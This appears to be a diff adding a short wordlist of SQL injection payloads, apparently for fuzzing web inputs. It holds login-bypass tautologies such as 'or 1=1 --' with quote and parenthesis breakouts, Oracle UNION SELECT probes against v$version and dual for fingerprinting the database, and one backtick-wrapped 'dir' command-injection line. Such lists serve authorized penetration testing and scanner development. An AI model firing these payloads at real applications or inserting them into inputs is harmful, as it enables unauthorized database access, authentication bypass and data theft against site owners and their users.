@@ -1,0 +1,26 @@
+`
+`dir`
+` or 1=1 #
+` or 1=1 --
+` or 1=1 -- -
+union select banner from v$version--
+'union select banner from v$version--
+"union select banner from v$version--
+union select null from dual
+'union select null from dual--
+"union select null from dual--
+union select banner from v$version
+')union select banner from v$version--
+';)union select banner from v$version--
+');union select banner from v$version--
+")union select banner from v$version--
+";)union select banner from v$version--
+");union select banner from v$version--
+or '1'='1
+')or '1'='1
+';)or '1'='1
+');or '1'='1
+" or "1"="1
+") or "1"="1
+";) or "1"="1
+"); or "1"="1
